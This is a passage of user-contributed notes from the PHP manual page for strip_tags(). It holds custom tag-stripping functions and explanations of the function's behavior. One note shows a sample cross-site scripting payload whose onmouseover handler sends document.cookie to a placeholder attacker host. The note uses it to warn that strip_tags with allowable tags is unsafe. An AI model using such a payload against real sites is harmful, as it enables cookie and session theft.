+a HTML code like this: <br /><br /><span class="default">&lt;?php<br />$html </span><span class="keyword">= </span><span class="string">'<br />&lt;div&gt;<br />&lt;p style="color:blue;"&gt;color is blue&lt;/p&gt;&lt;p&gt;size is &lt;span style="font-size:200%;"&gt;huge&lt;/span&gt;&lt;/p&gt;<br />&lt;p&gt;material is wood&lt;/p&gt;<br />&lt;/div&gt;<br />'</span><span class="keyword">; <br /></span><span class="default">?&gt;<br /></span><br />with <span class="default">&lt;?php $str </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$html</span><span class="keyword">); </span><span class="default">?&gt;<br /></span>... the result is:<br /><br />$str = 'color is bluesize is huge<br />material is wood'; <br /><br />notice: the words 'blue' and 'size' grow together :( <br />and line-breaks are still in new string $str<br /><br />if you need a space between the words (and without line-break) <br />use my function: <span class="default">&lt;?php $str </span><span class="keyword">= </span><span class="default">rip_tags</span><span class="keyword">(</span><span class="default">$html</span><span class="keyword">); </span><span class="default">?&gt;<br /></span>... the result is:<br /><br />$str = 'color is blue size is huge material is wood'; <br /><br />the function: <br /><br /><span class="default">&lt;?php<br /></span><span class="comment">// -------------------------------------------------------------- <br /><br /></span><span class="keyword">function </span><span class="default">rip_tags</span><span class="keyword">(</span><span class="default">$string</span><span class="keyword">) { <br />&nbsp; &nbsp; <br />&nbsp; &nbsp; </span><span class="comment">// ----- remove HTML TAGs ----- <br />&nbsp; &nbsp; </span><span class="default">$string </span><span class="keyword">= </span><span class="default">preg_replace </span><span class="keyword">(</span><span class="string">'/&lt;[^&gt;]*&gt;/'</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">); <br />&nbsp; &nbsp; <br />&nbsp; &nbsp; </span><span class="comment">// ----- remove control characters ----- <br />&nbsp; &nbsp; </span><span class="default">$string </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">"\r"</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">);&nbsp; &nbsp; </span><span class="comment">// --- replace with empty space<br />&nbsp; &nbsp; </span><span class="default">$string </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">"\n"</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">);&nbsp;&nbsp; </span><span class="comment">// --- replace with space<br />&nbsp; &nbsp; </span><span class="default">$string </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">"\t"</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">);&nbsp;&nbsp; </span><span class="comment">// --- replace with space<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; // ----- remove multiple spaces ----- <br />&nbsp; &nbsp; </span><span class="default">$string </span><span class="keyword">= </span><span class="default">trim</span><span class="keyword">(</span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/ {2,}/'</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">));<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; return </span><span class="default">$string</span><span class="keyword">; <br /><br />}<br /><br /></span><span class="comment">// -------------------------------------------------------------- <br /></span><span class="default">?&gt;<br /></span><br />the KEY is the regex pattern: '/&lt;[^&gt;]*&gt;/'<br />instead of strip_tags() <br />... then remove control characters and multiple spaces<br />:)</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="115354"> <div class="votes">
+<div id="Vu115354">
+<a href="http://php.net/manual/vote-note.php?id=115354&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd115354">
+<a href="http://php.net/manual/vote-note.php?id=115354&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V115354" title="55% like this...">
+    2
+    </div>
+</div>
+<a href="#115354" class="name">
+<strong class="user"><em>bnt dot gloria at outlook dot com</em></strong></a><a class="genanchor" href="#115354"> &para;</a><div class="date" title="2014-07-10 03:52"><strong>1 year ago</strong></div>
+<div class="text" id="Hcom115354">
+<div class="phpcode"><code><span class="html">
+With allowable_tags, strip-tags is not safe.<br /><br /><span class="default">&lt;?php<br /><br />$str</span><span class="keyword">= </span><span class="string">"&lt;p onmouseover=\"window.location='<a href="http://www.theBad.com/?cookie=" rel="nofollow" target="_blank">http://www.theBad.com/?cookie=</a>'+document.cookie;\"&gt; don't mouseover &lt;/p&gt;"</span><span class="keyword">;<br /></span><span class="default">$str</span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">, </span><span class="string">'&lt;p&gt;'</span><span class="keyword">);<br />echo </span><span class="default">$str</span><span class="keyword">; </span><span class="comment">// DISPLAY: &lt;p onmouseover=\"window.location='<a href="http://www.theBad.com/?cookie=" rel="nofollow" target="_blank">http://www.theBad.com/?cookie=</a>'+document.cookie;\"&gt; don't mouseover &lt;/p&gt;";<br /><br /></span><span class="default">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="114101"> <div class="votes">
+<div id="Vu114101">
+<a href="http://php.net/manual/vote-note.php?id=114101&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd114101">
+<a href="http://php.net/manual/vote-note.php?id=114101&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V114101" title="52% like this...">
+    1
+    </div>
+</div>
+<a href="#114101" class="name">
+<strong class="user"><em>obeyer at popsugar dot com</em></strong></a><a class="genanchor" href="#114101"> &para;</a><div class="date" title="2014-01-10 11:50"><strong>2 years ago</strong></div>
+<div class="text" id="Hcom114101">
+<div class="phpcode"><code><span class="html">
+actually, for PHP 5.4.19, if you want to add line breaks &lt;br&gt; to allowable tags, you should use "&lt;br&gt;". Both &lt;br/&gt; and &lt;br /&gt; in allowable tags won't do anything, and line breaks will be stripped</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="118485"> <div class="votes">
+<div id="Vu118485">
+<a href="http://php.net/manual/vote-note.php?id=118485&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd118485">
+<a href="http://php.net/manual/vote-note.php?id=118485&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V118485" title="100% like this...">
+    1
+    </div>
+</div>
+<a href="#118485" class="name">
+<strong class="user"><em>Trititaty</em></strong></a><a class="genanchor" href="#118485"> &para;</a><div class="date" title="2015-12-14 09:28"><strong>1 month ago</strong></div>
+<div class="text" id="Hcom118485">
+<div class="phpcode"><code><span class="html">
+Features:<br />* allowable tags (as in strip_tags),<br />* optional stripping attributes of the allowable tags,<br />* optional comment preserving,<br />* deleting broken and unclosed tags and comments,<br />* optional callback function call for every piece processed allowing for flexible replacements.<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">better_strip_tags</span><span class="keyword">( </span><span class="default">$str</span><span class="keyword">, </span><span class="default">$allowable_tags </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">, </span><span class="default">$strip_attrs </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">, </span><span class="default">$preserve_comments </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">, callable </span><span class="default">$callback </span><span class="keyword">= </span><span class="default">null </span><span class="keyword">) {<br />&nbsp; </span><span class="default">$allowable_tags </span><span class="keyword">= </span><span class="default">array_map</span><span class="keyword">( </span><span class="string">'strtolower'</span><span class="keyword">, </span><span class="default">array_filter</span><span class="keyword">( </span><span class="comment">// lowercase<br />&nbsp; &nbsp; &nbsp; </span><span class="default">preg_split</span><span class="keyword">( </span><span class="string">'/(?:&gt;|^)\\s*(?:&lt;|$)/'</span><span class="keyword">, </span><span class="default">$allowable_tags</span><span class="keyword">, -</span><span class="default">1</span><span class="keyword">, </span><span class="default">PREG_SPLIT_NO_EMPTY </span><span class="keyword">), </span><span class="comment">// get tag names<br />&nbsp; &nbsp; &nbsp; </span><span class="keyword">function( </span><span class="default">$tag </span><span class="keyword">) { return </span><span class="default">preg_match</span><span class="keyword">( </span><span class="string">'/^[a-z][a-z0-9_]*$/i'</span><span class="keyword">, </span><span class="default">$tag </span><span class="keyword">); } </span><span class="comment">// filter broken<br />&nbsp; </span><span class="keyword">) );<br />&nbsp; </span><span class="default">$comments_and_stuff </span><span class="keyword">= </span><span class="default">preg_split</span><span class="keyword">( </span><span class="string">'/(&lt;!--.*?(?:--&gt;|$))/'</span><span class="keyword">, </span><span class="default">$str</span><span class="keyword">, -</span><span class="default">1</span><span class="keyword">, </span><span class="default">PREG_SPLIT_DELIM_CAPTURE </span><span class="keyword">);<br />&nbsp; foreach ( </span><span class="default">$comments_and_stuff </span><span class="keyword">as </span><span class="default">$i </span><span class="keyword">=&gt; </span><span class="default">$comment_or_stuff </span><span class="keyword">) {<br />&nbsp; &nbsp; if ( </span><span class="default">$i </span><span class="keyword">% </span><span class="default">2 </span><span class="keyword">) { </span><span class="comment">// html comment<br />&nbsp; &nbsp; &nbsp; </span><span class="keyword">if ( !( </span><span class="default">$preserve_comments </span><span class="keyword">&amp;&amp; </span><span class="default">preg_match</span><span class="keyword">( </span><span class="string">'/&lt;!--.*?--&gt;/'</span><span class="keyword">, </span><span class="default">$comment_or_stuff </span><span class="keyword">) ) ) {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$comments_and_stuff</span><span class="keyword">[</span><span class="default">$i</span><span class="keyword">] = </span><span class="string">''</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; } else { </span><span class="comment">// stuff between comments<br />&nbsp; &nbsp; &nbsp; </span><span class="default">$tags_and_text </span><span class="keyword">= </span><span class="default">preg_split</span><span class="keyword">( </span><span class="string">"/(&lt;(?:[^&gt;\"']++|\"[^\"]*+(?:\"|$)|'[^']*+(?:'|$))*(?:&gt;|$))/"</span><span class="keyword">, </span><span class="default">$comment_or_stuff</span><span class="keyword">, -</span><span class="default">1</span><span class="keyword">, </span><span class="default">PREG_SPLIT_DELIM_CAPTURE </span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; foreach ( </span><span class="default">$tags_and_text </span><span class="keyword">as </span><span class="default">$j </span><span class="keyword">=&gt; </span><span class="default">$tag_or_text </span><span class="keyword">) {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$is_broken </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$is_allowable </span><span class="keyword">= </span><span class="default">true</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$result </span><span class="keyword">= </span><span class="default">$tag_or_text</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; if ( </span><span class="default">$j </span><span class="keyword">% </span><span class="default">2 </span><span class="keyword">) { </span><span class="comment">// tag<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="keyword">if ( </span><span class="default">preg_match</span><span class="keyword">( </span><span class="string">"%^(&lt;/?)([a-z][a-z0-9_]*)\\b(?:[^&gt;\"'/]++|/+?|\"[^\"]*\"|'[^']*')*?(/?&gt;)%i"</span><span class="keyword">, </span><span class="default">$tag_or_text</span><span class="keyword">, </span><span class="default">$matches </span><span class="keyword">) ) {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$tag </span><span class="keyword">= </span><span class="default">strtolower</span><span class="keyword">( </span><span class="default">$matches</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">] );<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( </span><span class="default">in_array</span><span class="keyword">( </span><span class="default">$tag</span><span class="keyword">, </span><span class="default">$allowable_tags </span><span class="keyword">) ) {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( </span><span class="default">$strip_attrs </span><span class="keyword">) {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$opening </span><span class="keyword">= </span><span class="default">$matches</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">];<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$closing </span><span class="keyword">= ( </span><span class="default">$opening </span><span class="keyword">=== </span><span class="string">'&lt;/' </span><span class="keyword">) ? </span><span class="string">'&gt;' </span><span class="keyword">: </span><span class="default">$closing</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$result </span><span class="keyword">= </span><span class="default">$opening </span><span class="keyword">. </span><span class="default">$tag </span><span class="keyword">. </span><span class="default">$closing</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$is_allowable </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$result </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$is_broken </span><span class="keyword">= </span><span class="default">true</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$result </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; } else { </span><span class="comment">// text<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$tag </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; if ( !</span><span class="default">$is_broken </span><span class="keyword">&amp;&amp; isset( </span><span class="default">$callback </span><span class="keyword">) ) {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">// allow result modification<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">call_user_func_array</span><span class="keyword">( </span><span class="default">$callback</span><span class="keyword">, array( &amp;</span><span class="default">$result</span><span class="keyword">, </span><span class="default">$tag_or_text</span><span class="keyword">, </span><span class="default">$tag</span><span class="keyword">, </span><span class="default">$is_allowable </span><span class="keyword">) );<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$tags_and_text</span><span class="keyword">[</span><span class="default">$j</span><span class="keyword">] = </span><span class="default">$result</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; </span><span class="default">$comments_and_stuff</span><span class="keyword">[</span><span class="default">$i</span><span class="keyword">] = </span><span class="default">implode</span><span class="keyword">( </span><span class="string">''</span><span class="keyword">, </span><span class="default">$tags_and_text </span><span class="keyword">);<br />&nbsp; &nbsp; }<br />&nbsp; }<br />&nbsp; </span><span class="default">$str </span><span class="keyword">= </span><span class="default">implode</span><span class="keyword">( </span><span class="string">''</span><span class="keyword">, </span><span class="default">$comments_and_stuff </span><span class="keyword">);<br />&nbsp; return </span><span class="default">$str</span><span class="keyword">;<br />}<br /></span><span class="default">?&gt;<br /></span><br />Callback arguments:<br />* &amp;$result: contains text to be placed insted of original piece (e.g. empty string for forbidden tags), it can be changed;<br />* $tag_or_text: original piece of text or a tag (see below);<br />* $tag: false for text between tags, lowercase tag name for tags;<br />* $is_allowable: boolean telling if a tag isn't allowed (to avoid double checking), always true for text between tags<br />Callback function isn't called for comments and broken tags.<br /><br />Caution: the function doesn't fully validate tags (the more so HTML itself), it just force strips those obviously broken (in addition to stripping forbidden tags). If you want to get valid tags then use strip_attrs option, though it doesn't guarantee tags are balanced or used in the appropriate context. For complex logic consider using DOM parser.</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="117793"> <div class="votes">
+<div id="Vu117793">
+<a href="http://php.net/manual/vote-note.php?id=117793&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd117793">
+<a href="http://php.net/manual/vote-note.php?id=117793&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V117793" title="50% like this...">
+    0
+    </div>
+</div>
+<a href="#117793" class="name">
+<strong class="user"><em>doug at exploittheweb dot com</em></strong></a><a class="genanchor" href="#117793"> &para;</a><div class="date" title="2015-08-11 10:17"><strong>5 months ago</strong></div>
+<div class="text" id="Hcom117793">
+<div class="phpcode"><code><span class="html">
+"5.3.4&nbsp; &nbsp; strip_tags() no longer strips self-closing XHTML tags unless the self-closing XHTML tag is also given in allowable_tags."<br /><br />This is poorly worded.<br /><br />The above seems to be saying that, since 5.3.4, if you don't specify "&lt;br/&gt;" in allowable_tags then "&lt;br/&gt;" will not be stripped... but that's not actually what they're trying to say.<br /><br />What it means is, in versions prior to 5.3.4, it "strips self-closing XHTML tags unless the self-closing XHTML tag is also given in allowable_tags", and that since 5.3.4 this is no longer the case.<br /><br />So what reads as "no longer strips self-closing tags (unless the self-closing XHTML tag is also given in allowable_tags)" is actually saying "no longer (strips self-closing tags unless the self-closing XHTML tag is also given in allowable_tags)".<br /><br />i.e.<br /><br />pre-5.3.4: strip_tags('Hello World&lt;br&gt;&lt;br/&gt;','&lt;br&gt;') =&gt; 'Hello World&lt;br&gt;' // strips &lt;br/&gt; because it wasn't explicitly specified in allowable_tags<br /><br />5.3.4 and later: strip_tags('Hello World&lt;br&gt;&lt;br/&gt;','&lt;br&gt;') =&gt; 'Hello World&lt;br&gt;&lt;br/&gt;' // does not strip &lt;br/&gt; because PHP matches it with &lt;br&gt; in allowable_tags</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="117351"> <div class="votes">
+<div id="Vu117351">
+<a href="http://php.net/manual/vote-note.php?id=117351&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd117351">
+<a href="http://php.net/manual/vote-note.php?id=117351&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V117351" title="50% like this...">
+    0
+    </div>
+</div>
+<a href="#117351" class="name">
+<strong class="user"><em>valentin dot boschatel at evalandgo dot com</em></strong></a><a class="genanchor" href="#117351"> &para;</a><div class="date" title="2015-05-26 09:41"><strong>8 months ago</strong></div>
+<div class="text" id="Hcom117351">
+<div class="phpcode"><code><span class="html">
+Hi,<br /><br />I havee a problem with this function. I want use this symbol in my text ( &lt; ), but it doesn't work because I added character stuck to that symbol.<br /><br />Exemple :<br /><span class="default">&lt;?php<br />$test </span><span class="keyword">= </span><span class="string">'&lt;p&gt;&lt;span style="color: #ff0000; background-color: #000000;"&gt;Complex&lt;/span&gt; &lt;span style="font-family: impact,chicago;"&gt;text &lt;50% &lt;/span&gt; &lt;a href="<a href="http://exempledomain.com/" rel="nofollow" target="_blank">http://exempledomain.com/</a>"&gt;&lt;em&gt;with&lt;/em&gt;&lt;/a&gt; &lt;span style="font-size: 36pt;"&gt;&lt;strong&gt;tags&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;'</span><span class="keyword">;<br /><br />echo </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="string">'$test'</span><span class="keyword">);<br /></span><span class="comment">// Outputs : Complex text<br /></span><span class="default">?&gt;<br /></span><br />I made a function for this :<br /><br />Function: <br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">strip_tags_review</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">, </span><span class="default">$allowable_tags </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">) {<br /><br />&nbsp; &nbsp; </span><span class="default">preg_match_all</span><span class="keyword">(</span><span class="string">'/&lt;(.+?)[\s]*\/?[\s]*&gt;/si'</span><span class="keyword">, </span><span class="default">trim</span><span class="keyword">(</span><span class="default">$allowable_tags</span><span class="keyword">), </span><span class="default">$tags</span><span class="keyword">);<br />&nbsp; &nbsp; </span><span class="default">$tags </span><span class="keyword">= </span><span class="default">array_unique</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br /><br />&nbsp; &nbsp; if(</span><span class="default">is_array</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">) AND </span><span class="default">count</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">) &gt; </span><span class="default">0</span><span class="keyword">) {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$pattern </span><span class="keyword">= </span><span class="string">'@&lt;(?!(?:' </span><span class="keyword">. </span><span class="default">implode</span><span class="keyword">(</span><span class="string">'|'</span><span class="keyword">, </span><span class="default">$tags</span><span class="keyword">) . </span><span class="string">')\b)(\w+)\b.*?&gt;(.*?)&lt;/\1&gt;@i'</span><span class="keyword">;<br />&nbsp; &nbsp; }<br />&nbsp; &nbsp; else {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$pattern </span><span class="keyword">= </span><span class="string">'@&lt;(\w+)\b.*?&gt;(.*?)&lt;/\1&gt;@i'</span><span class="keyword">;<br />&nbsp; &nbsp; }<br /><br />&nbsp; &nbsp; </span><span class="default">$str </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">, </span><span class="string">'$2'</span><span class="keyword">, </span><span class="default">$str</span><span class="keyword">);<br />&nbsp; &nbsp; return </span><span class="default">preg_match</span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">, </span><span class="default">$str</span><span class="keyword">) ? </span><span class="default">strip_tags_review</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">, </span><span class="default">$allowable_tags</span><span class="keyword">) : </span><span class="default">$str</span><span class="keyword">;<br />}<br /><br />echo </span><span class="default">strip_tags_review</span><span class="keyword">(</span><span class="default">$test</span><span class="keyword">);<br /></span><span class="comment">// Outputs: Complex text &lt;50%&nbsp; with tags<br /><br /></span><span class="keyword">echo </span><span class="default">strip_tags_review</span><span class="keyword">(</span><span class="default">$test</span><span class="keyword">, </span><span class="string">'&lt;a&gt;'</span><span class="keyword">);<br /></span><span class="comment">// Outputs: Complex text &lt;50%&nbsp; &lt;a href="<a href="http://exempledomain.com" rel="nofollow" target="_blank">http://exempledomain.com</a>"&gt;with&lt;/a&gt; tags<br /></span><span class="default">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="118295"> <div class="votes">
+<div id="Vu118295">
+<a href="http://php.net/manual/vote-note.php?id=118295&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd118295">
+<a href="http://php.net/manual/vote-note.php?id=118295&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V118295" title="0% like this...">
+    -1
+    </div>
+</div>
+<a href="#118295" class="name">
+<strong class="user"><em>denis dot for dot spam at gmail dot com</em></strong></a><a class="genanchor" href="#118295"> &para;</a><div class="date" title="2015-11-10 01:36"><strong>2 months ago</strong></div>
+<div class="text" id="Hcom118295">
+<div class="phpcode"><code><span class="html">
+my function to remove specific tags with the content and can remove elements with attributes<br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">strip_selected_tags_content</span><span class="keyword">( </span><span class="default">$text</span><span class="keyword">, </span><span class="default">$tags </span><span class="keyword">= array() ) {<br />&nbsp; &nbsp; foreach ( </span><span class="default">$tags </span><span class="keyword">as </span><span class="default">$key </span><span class="keyword">=&gt; </span><span class="default">$val </span><span class="keyword">) {<br />&nbsp; &nbsp; &nbsp; &nbsp; if ( ! </span><span class="default">is_array</span><span class="keyword">( </span><span class="default">$val </span><span class="keyword">) ) {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">( </span><span class="string">'/&lt;' </span><span class="keyword">. </span><span class="default">$val </span><span class="keyword">. </span><span class="string">'[^&gt;]*&gt;([\s\S]*?)&lt;\/' </span><span class="keyword">. </span><span class="default">$val </span><span class="keyword">. </span><span class="string">'[^&gt;]*&gt;/'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text </span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; } else {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">( </span><span class="string">'/&lt;' </span><span class="keyword">. </span><span class="default">$val</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">] . </span><span class="string">' ' </span><span class="keyword">. </span><span class="default">$val</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">] . </span><span class="string">'[^&gt;]*&gt;([\s\S]*?)&lt;\/' </span><span class="keyword">. </span><span class="default">$val</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">] . </span><span class="string">'[^&gt;]*&gt;/'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text </span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; }<br />&nbsp; &nbsp; return </span><span class="default">$text</span><span class="keyword">;<br />}<br /></span><span class="default">?&gt;<br /></span>example:<br /><span class="default">&lt;?php<br />$clear </span><span class="keyword">= array(</span><span class="string">'social'</span><span class="keyword">,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="string">'script'</span><span class="keyword">,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="string">'noindex'</span><span class="keyword">,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="string">'time'</span><span class="keyword">,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="string">'header'</span><span class="keyword">,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; array( </span><span class="string">'div'</span><span class="keyword">, </span><span class="string">'class="tags"' </span><span class="keyword">),<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; array( </span><span class="string">'div'</span><span class="keyword">, </span><span class="string">'class="box_comments"' </span><span class="keyword">),<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; array( </span><span class="string">'p'</span><span class="keyword">, </span><span class="string">'class="form-submit"' </span><span class="keyword">),<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; array( </span><span class="string">'div'</span><span class="keyword">, </span><span class="string">'class="comment-form-comment"' </span><span class="keyword">)<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )<br /></span><span class="default">text </span><span class="keyword">= </span><span class="string">'&lt;preheader&gt;image article&lt;/preheader&gt;<br />&lt;header&gt;nnnnn&lt;/header&gt;<br />&lt;social&gt;fb code, google code etc...&lt;/social&gt;<br />etc....<br />&lt;p class="text"&gt;<br />bla-bla bla-blabla-bla bla-blabla-bla bla-bla<br />&lt;/p&gt;<br />&lt;div&gt;sdasda&lt;/div&gt;<br />&lt;div class="tags"&gt;true code, that code&lt;/div&gt;<br />&lt;div calss="comment-form-comment"&gt; coment form on blog&lt;/div&gt;<br />'</span><span class="keyword">;<br />echo </span><span class="default">strip_selected_tags_content</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">$clear</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>output:<br /><span class="default">&lt;?php<br /></span><span class="keyword">&lt;</span><span class="default">preheader</span><span class="keyword">&gt;</span><span class="default">image article</span><span class="keyword">&lt;/</span><span class="default">preheader</span><span class="keyword">&gt;<br /></span><span class="default">etc</span><span class="keyword">....<br />&lt;</span><span class="default">p </span><span class="keyword">class=</span><span class="string">"text"</span><span class="keyword">&gt;<br /></span><span class="default">bla</span><span class="keyword">-</span><span class="default">bla bla</span><span class="keyword">-</span><span class="default">blabla</span><span class="keyword">-</span><span class="default">bla bla</span><span class="keyword">-</span><span class="default">blabla</span><span class="keyword">-</span><span class="default">bla bla</span><span class="keyword">-</span><span class="default">bla<br /></span><span class="keyword">&lt;/</span><span class="default">p</span><span class="keyword">&gt;<br />&lt;</span><span class="default">div</span><span class="keyword">&gt;</span><span class="default">sdasda</span><span class="keyword">&lt;/</span><span class="default">div</span><span class="keyword">&gt;<br /></span><span class="default">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="62705"> <div class="votes">
+<div id="Vu62705">
+<a href="http://php.net/manual/vote-note.php?id=62705&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd62705">
+<a href="http://php.net/manual/vote-note.php?id=62705&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V62705" title="50% like this...">
+    0
+    </div>
+</div>
+<a href="#62705" class="name">
